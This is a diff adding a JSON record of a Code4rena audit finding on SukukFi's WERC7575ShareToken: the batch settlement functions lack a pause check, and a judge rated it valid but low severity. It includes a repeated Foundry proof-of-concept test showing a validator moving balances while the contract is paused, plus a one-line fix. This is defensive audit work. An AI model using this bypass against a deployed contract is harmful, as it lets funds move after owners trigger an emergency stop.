@@ -1,0 +1,108 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "rjL9FdNnrCk",
+    "requested_finding_uid": "6N4VUdiTEaa",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "rjL9FdNnrCk",
+    "source_finding_uid": "6N4VUdiTEaa",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\low_valid_rjL9FdNnrCk.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "rjL9FdNnrCk",
+  "finding_uid": "6N4VUdiTEaa",
+  "finding_number": "6",
+  "title": "Validator Can Bypass Emergency Pause on Settlement Layer",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "",
+  "user_handle": "Nyxaris",
+  "body": "## Finding description and impact\n\n**Description**: The `WERC7575ShareToken` contract inherits from OpenZeppelin's `Pausable` and implements a `pause()` function, which is intended to serve as a circuit breaker during emergencies (e.g., smart contract exploits, key compromises, or critical bug discoveries). While standard ERC20 state-changing functions such as `transfer`, `transferFrom`, `mint`, and burn are correctly protected by the whenNotPaused modifier, the specialized bulk settlement functions—batchTransfers and rBatchTransfers—are explicitly missing this protection.\n\nImpact: The `batchTransfers` and `rBatchTransfers` functions constitute the primary operational engine of the protocol, handling high-volume settlement transactions. If the Validator key is compromised or a logic error is found within the settlement accounting, the Protocol Owner would intuitively trigger the pause() function to secure user funds.\n\nHowever, because these functions lack the whenNotPaused modifier, the pause would fail to stop the Validator. A malicious actor holding the Validator key could continue to execute batch transfers, move liquid funds, and corrupt restricted balance (rBalance) accounting even while the contract claims to be \"paused.\" This completely negates the utility of the emergency stop mechanism for the protocol's most critical operations.\n\n## Recommended mitigation steps\n\n- Apply the whenNotPaused modifier to the function signatures of both batchTransfers and rBatchTransfers in `src/WERC7575ShareToken.sol`.\n\n```solidity\n- function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {\n+ function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator whenNotPaused returns (bool) {\n```",
+  "proof_of_concept": "Add this to this test directory.\n\nrun `forge test -vvv --match-path test/PoC_ValidatorPauseBypass.t.sol`\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"./MockAsset.sol\";\n\ncontract PoC_ValidatorPauseBypass is Test {\n    WERC7575ShareToken token;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address attacker = address(0xBEEF);\n    address debtor = address(0xDEAD);\n    address creditor = address(0xCAFE);\n\n    function setUp() public {\n        // deploy shared components\n        asset = new MockAsset();\n        // mint assets to this test contract so it can deposit to vault\n        asset.mint(address(this), 10000 ether);\n\n        token = new WERC7575ShareToken(\"PoC WERC\", \"pWERC\");\n        vault = new WERC7575Vault(address(asset), token);\n\n        // register vault and approve asset transfers\n        token.registerVault(address(asset), address(vault));\n        asset.approve(address(vault), type(uint256).max);\n\n        // set KYC for debtor/creditor\n        token.setKycVerified(debtor, true);\n        token.setKycVerified(creditor, true);\n\n        // deposit assets into vault to mint shares to debtor\n        vault.deposit(100 ether, debtor);\n\n        // sanity check\n        assertEq(token.balanceOf(debtor), 100 ether);\n    }\n\n    /// @notice Demonstrates validator can execute batchTransfers while contract is paused\n    function test_batchTransfers_skipsPause() public {\n        // pause the contract as owner\n        token.pause();\n        assertTrue(token.paused(), \"contract should be paused\");\n\n        // set validator to attacker\n        token.setValidator(attacker);\n\n        // craft a single transfer debtor -> creditor of 10\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 10 ether;\n\n        // Call batchTransfers as validator (attacker). Because batchTransfers lacks whenNotPaused,\n        // this will succeed even though the contract is paused.\n        vm.prank(attacker);\n        bool ok = token.batchTransfers(debtors, creditors, amounts);\n        assertTrue(ok, \"batchTransfers should succeed even when paused\");\n\n        // verify balances changed despite pause\n        assertEq(token.balanceOf(debtor), 90 ether);\n        assertEq(token.balanceOf(creditor), 10 ether);\n    }\n\n    /// @notice Demonstrates rBatchTransfers also bypasses pause\n    function test_rBatchTransfers_skipsPause() public {\n        // pause and set validator\n        token.pause();\n        assertTrue(token.paused());\n        token.setValidator(attacker);\n\n        // single transfer arrays\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 5 ether;\n\n        uint256 rBalanceFlags = 0; // no rBalance updates\n\n        vm.prank(attacker);\n        bool ok = token.rBatchTransfers(debtors, creditors, amounts, rBalanceFlags);\n        assertTrue(ok, \"rBatchTransfers should succeed even when paused\");\n\n        // check balances updated\n        assertEq(token.balanceOf(debtor), 95 ether);\n        assertEq(token.balanceOf(creditor), 5 ether);\n    }\n}\n\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575ShareToken.sol#L700-#L734"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "952",
+    "api_submission_id": "",
+    "uid": "rjL9FdNnrCk",
+    "number": "952",
+    "title": "Validator Can Bypass Emergency Pause on Settlement Layer",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "",
+    "handle": "Nyxaris",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575ShareToken.sol#L700-#L734"
+    ],
+    "body": "## Finding description and impact\n\n**Description**: The `WERC7575ShareToken` contract inherits from OpenZeppelin's `Pausable` and implements a `pause()` function, which is intended to serve as a circuit breaker during emergencies (e.g., smart contract exploits, key compromises, or critical bug discoveries). While standard ERC20 state-changing functions such as `transfer`, `transferFrom`, `mint`, and burn are correctly protected by the whenNotPaused modifier, the specialized bulk settlement functions—batchTransfers and rBatchTransfers—are explicitly missing this protection.\n\nImpact: The `batchTransfers` and `rBatchTransfers` functions constitute the primary operational engine of the protocol, handling high-volume settlement transactions. If the Validator key is compromised or a logic error is found within the settlement accounting, the Protocol Owner would intuitively trigger the pause() function to secure user funds.\n\nHowever, because these functions lack the whenNotPaused modifier, the pause would fail to stop the Validator. A malicious actor holding the Validator key could continue to execute batch transfers, move liquid funds, and corrupt restricted balance (rBalance) accounting even while the contract claims to be \"paused.\" This completely negates the utility of the emergency stop mechanism for the protocol's most critical operations.\n\n## Recommended mitigation steps\n\n- Apply the whenNotPaused modifier to the function signatures of both batchTransfers and rBatchTransfers in `src/WERC7575ShareToken.sol`.\n\n```solidity\n- function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {\n+ function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator whenNotPaused returns (bool) {\n```",
+    "proof_of_concept": "Add this to this test directory.\n\nrun `forge test -vvv --match-path test/PoC_ValidatorPauseBypass.t.sol`\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"./MockAsset.sol\";\n\ncontract PoC_ValidatorPauseBypass is Test {\n    WERC7575ShareToken token;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address attacker = address(0xBEEF);\n    address debtor = address(0xDEAD);\n    address creditor = address(0xCAFE);\n\n    function setUp() public {\n        // deploy shared components\n        asset = new MockAsset();\n        // mint assets to this test contract so it can deposit to vault\n        asset.mint(address(this), 10000 ether);\n\n        token = new WERC7575ShareToken(\"PoC WERC\", \"pWERC\");\n        vault = new WERC7575Vault(address(asset), token);\n\n        // register vault and approve asset transfers\n        token.registerVault(address(asset), address(vault));\n        asset.approve(address(vault), type(uint256).max);\n\n        // set KYC for debtor/creditor\n        token.setKycVerified(debtor, true);\n        token.setKycVerified(creditor, true);\n\n        // deposit assets into vault to mint shares to debtor\n        vault.deposit(100 ether, debtor);\n\n        // sanity check\n        assertEq(token.balanceOf(debtor), 100 ether);\n    }\n\n    /// @notice Demonstrates validator can execute batchTransfers while contract is paused\n    function test_batchTransfers_skipsPause() public {\n        // pause the contract as owner\n        token.pause();\n        assertTrue(token.paused(), \"contract should be paused\");\n\n        // set validator to attacker\n        token.setValidator(attacker);\n\n        // craft a single transfer debtor -> creditor of 10\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 10 ether;\n\n        // Call batchTransfers as validator (attacker). Because batchTransfers lacks whenNotPaused,\n        // this will succeed even though the contract is paused.\n        vm.prank(attacker);\n        bool ok = token.batchTransfers(debtors, creditors, amounts);\n        assertTrue(ok, \"batchTransfers should succeed even when paused\");\n\n        // verify balances changed despite pause\n        assertEq(token.balanceOf(debtor), 90 ether);\n        assertEq(token.balanceOf(creditor), 10 ether);\n    }\n\n    /// @notice Demonstrates rBatchTransfers also bypasses pause\n    function test_rBatchTransfers_skipsPause() public {\n        // pause and set validator\n        token.pause();\n        assertTrue(token.paused());\n        token.setValidator(attacker);\n\n        // single transfer arrays\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 5 ether;\n\n        uint256 rBalanceFlags = 0; // no rBalance updates\n\n        vm.prank(attacker);\n        bool ok = token.rBatchTransfers(debtors, creditors, amounts, rBalanceFlags);\n        assertTrue(ok, \"rBatchTransfers should succeed even when paused\");\n\n        // check balances updated\n        assertEq(token.balanceOf(debtor), 95 ether);\n        assertEq(token.balanceOf(creditor), 5 ether);\n    }\n}\n\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/952",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-05T15:31:56.260Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "2x3BJN92E9q",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T07:24:37.595Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "6N4VUdiTEaa"
+        },
+        {
+          "uid": "369ZnZY5p7a",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-11-30T07:24:40.392Z",
+          "type": "severity",
+          "value": "low",
+          "submissionUid": null,
+          "findingUid": "6N4VUdiTEaa"
+        }
+      ],
+      "finding": {
+        "uid": "6N4VUdiTEaa",
+        "number": 6,
+        "duplicates": 57
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": null,
+        "rank": null,
+        "severity": "low",
+        "validity": "valid",
+        "updatedAt": "2025-12-18T04:58:24.004Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Validator Can Bypass Emergency Pause on Settlement Layer",
+      "uid": "rjL9FdNnrCk",
+      "updatedAt": "2025-12-05T15:31:56.260Z",
+      "user": {
+        "uid": "yCnkCeBcyqR",
+        "handle": "Nyxaris"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\n**Description**: The `WERC7575ShareToken` contract inherits from OpenZeppelin's `Pausable` and implements a `pause()` function, which is intended to serve as a circuit breaker during emergencies (e.g., smart contract exploits, key compromises, or critical bug discoveries). While standard ERC20 state-changing functions such as `transfer`, `transferFrom`, `mint`, and burn are correctly protected by the whenNotPaused modifier, the specialized bulk settlement functions—batchTransfers and rBatchTransfers—are explicitly missing this protection.\n\nImpact: The `batchTransfers` and `rBatchTransfers` functions constitute the primary operational engine of the protocol, handling high-volume settlement transactions. If the Validator key is compromised or a logic error is found within the settlement accounting, the Protocol Owner would intuitively trigger the pause() function to secure user funds.\n\nHowever, because these functions lack the whenNotPaused modifier, the pause would fail to stop the Validator. A malicious actor holding the Validator key could continue to execute batch transfers, move liquid funds, and corrupt restricted balance (rBalance) accounting even while the contract claims to be \"paused.\" This completely negates the utility of the emergency stop mechanism for the protocol's most critical operations.\n\n## Recommended mitigation steps\n\n- Apply the whenNotPaused modifier to the function signatures of both batchTransfers and rBatchTransfers in `src/WERC7575ShareToken.sol`.\n\n```solidity\n- function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator returns (bool) {\n+ function batchTransfers(address[] calldata debtors, address[] calldata creditors, uint256[] calldata amounts) external onlyValidator whenNotPaused returns (bool) {\n```",
+      "proofOfConcept": "Add this to this test directory.\n\nrun `forge test -vvv --match-path test/PoC_ValidatorPauseBypass.t.sol`\n\n```solidity\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"./MockAsset.sol\";\n\ncontract PoC_ValidatorPauseBypass is Test {\n    WERC7575ShareToken token;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address attacker = address(0xBEEF);\n    address debtor = address(0xDEAD);\n    address creditor = address(0xCAFE);\n\n    function setUp() public {\n        // deploy shared components\n        asset = new MockAsset();\n        // mint assets to this test contract so it can deposit to vault\n        asset.mint(address(this), 10000 ether);\n\n        token = new WERC7575ShareToken(\"PoC WERC\", \"pWERC\");\n        vault = new WERC7575Vault(address(asset), token);\n\n        // register vault and approve asset transfers\n        token.registerVault(address(asset), address(vault));\n        asset.approve(address(vault), type(uint256).max);\n\n        // set KYC for debtor/creditor\n        token.setKycVerified(debtor, true);\n        token.setKycVerified(creditor, true);\n\n        // deposit assets into vault to mint shares to debtor\n        vault.deposit(100 ether, debtor);\n\n        // sanity check\n        assertEq(token.balanceOf(debtor), 100 ether);\n    }\n\n    /// @notice Demonstrates validator can execute batchTransfers while contract is paused\n    function test_batchTransfers_skipsPause() public {\n        // pause the contract as owner\n        token.pause();\n        assertTrue(token.paused(), \"contract should be paused\");\n\n        // set validator to attacker\n        token.setValidator(attacker);\n\n        // craft a single transfer debtor -> creditor of 10\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 10 ether;\n\n        // Call batchTransfers as validator (attacker). Because batchTransfers lacks whenNotPaused,\n        // this will succeed even though the contract is paused.\n        vm.prank(attacker);\n        bool ok = token.batchTransfers(debtors, creditors, amounts);\n        assertTrue(ok, \"batchTransfers should succeed even when paused\");\n\n        // verify balances changed despite pause\n        assertEq(token.balanceOf(debtor), 90 ether);\n        assertEq(token.balanceOf(creditor), 10 ether);\n    }\n\n    /// @notice Demonstrates rBatchTransfers also bypasses pause\n    function test_rBatchTransfers_skipsPause() public {\n        // pause and set validator\n        token.pause();\n        assertTrue(token.paused());\n        token.setValidator(attacker);\n\n        // single transfer arrays\n        address[] memory debtors = new address[](1);\n        address[] memory creditors = new address[](1);\n        uint256[] memory amounts = new uint256[](1);\n\n        debtors[0] = debtor;\n        creditors[0] = creditor;\n        amounts[0] = 5 ether;\n\n        uint256 rBalanceFlags = 0; // no rBalance updates\n\n        vm.prank(attacker);\n        bool ok = token.rBatchTransfers(debtors, creditors, amounts, rBalanceFlags);\n        assertTrue(ok, \"rBatchTransfers should succeed even when paused\");\n\n        // check balances updated\n        assertEq(token.balanceOf(debtor), 95 ether);\n        assertEq(token.balanceOf(creditor), 5 ether);\n    }\n}\n\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575ShareToken.sol#L700-#L734",
+      "number": 952,
+      "aiExplanation": null,
+      "_index": 952
+    }
+  }
+}
